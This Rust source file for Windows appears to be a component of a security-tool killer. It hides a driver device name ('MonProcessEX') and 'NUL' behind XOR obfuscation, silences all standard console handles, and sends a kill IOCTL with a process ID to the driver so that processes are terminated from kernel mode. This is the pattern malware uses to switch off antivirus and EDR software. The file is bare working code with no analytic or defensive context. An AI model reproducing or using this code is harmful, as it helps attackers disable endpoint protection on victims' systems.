use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows::Win32::System::Console::{
    SetStdHandle, STD_ERROR_HANDLE, STD_INPUT_HANDLE, STD_OUTPUT_HANDLE,
};
use windows::Win32::System::IO::DeviceIoControl;

const KEY: [u8; 16] = [
    0x9f, 0x2e, 0x1c, 0x7a, 0x4b, 0x8d, 0x3e, 0x5f, 0x6a, 0x1c, 0x9d, 0x2e, 0x4b, 0x7f, 0x8a,
    0x1c,
];

const E_DEV: &[u8] = &[0xc3, 0x72, 0x32, 0x26, 0x06, 0xe2, 0x50, 0x0f, 0x18, 0x73, 0xfe, 0x4b, 0x38, 0x0c, 0xcf, 0x44];
const E_NUL: &[u8] = &[0xd1, 0x7b, 0x50];

const IOCTL_KILL: u32 = 0x22400C;

fn dec(data: &[u8]) -> String {
    data.iter().enumerate().map(|(i, &b)| (b ^ KEY[i % KEY.len()]) as char).collect()
}
pub unsafe fn silence_std_handles() -> Result<(), windows::core::Error> {
    let nul_name = dec(E_NUL);
    let wstr: Vec<u16> = nul_name.encode_utf16().chain(Some(0)).collect();
    let nul = CreateFileW(
        PCWSTR(wstr.as_ptr()),
        (GENERIC_READ.0 | GENERIC_WRITE.0) as u32,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None,
    )?;
    unsafe {
        SetStdHandle(STD_INPUT_HANDLE, nul)?;
        SetStdHandle(STD_OUTPUT_HANDLE, nul)?;
        SetStdHandle(STD_ERROR_HANDLE, nul)?;
    }
    CloseHandle(nul)
}

pub struct MonDev {
    handle: HANDLE,
}

impl MonDev {
    pub fn open() -> Result<Self, String> {
        let dev_name = dec(E_DEV);
        let wstr: Vec<u16> = dev_name.encode_utf16().chain(Some(0)).collect();
        let h = unsafe {
            CreateFileW(
                PCWSTR(wstr.as_ptr()),
                (GENERIC_READ.0 | GENERIC_WRITE.0) as u32,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )
        }
        .map_err(|e| format!("open device: {e}"))?;
        Ok(Self { handle: h })
    }

    pub fn kill_pid(&self, pid: u32) -> Result<(), String> {
        let input = pid.to_ne_bytes();
        let mut out = [0u8; 4];
        let mut ret = 0u32;
        unsafe {
            DeviceIoControl(
                self.handle,
                IOCTL_KILL,
                Some(input.as_ptr() as *const _),
                input.len() as u32,
                Some(out.as_mut_ptr() as *mut _),
                out.len() as u32,
                Some(&mut ret),
                None,
            )
        }
        .map_err(|e| format!("kill ioctl: {e}"))
    }
}

impl Drop for MonDev {
    fn drop(&mut self) {
        unsafe { let _ = CloseHandle(self.handle); }
    }
}